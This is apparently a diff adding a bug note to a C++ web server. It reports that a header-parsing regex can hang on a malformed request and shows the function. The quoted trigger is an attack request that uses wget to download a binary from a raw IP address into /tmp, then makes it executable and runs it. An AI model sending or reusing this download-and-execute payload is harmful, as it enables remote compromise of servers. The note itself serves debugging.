@@ -1,0 +1,18 @@
+1. malformed request may cause regex clause to hang up in a dead loop!!!
+  sample code:
+    bool Server::web_hdrinfo(const void* ptr, size_t len, string& cmd, string& path, string& ver) {
+      regex re("([A-Z]+)[\t ]+([^\r\n\t ]+*)[\t ]+([A-Z]+/[0-9]+\\.[0-9]+)");
+      smatch sm;
+      string str((const char*) ptr, MIN(len, 64));
+
+      if (regex_search(str, sm, re) && sm.size() == 4) {
+        cmd = sm[1];
+        path = sm[2];
+        ver = sm[3];
+        return true;
+      }
+
+      return false;
+    }
+  malformed request:
+    GET /shell?cd+/tmp;rm+-rf+.j;wget+http:/\/91.92.66.124/..j/.j;chmod+777+.j;sh+.j;echo+DONE HTTP/1.1
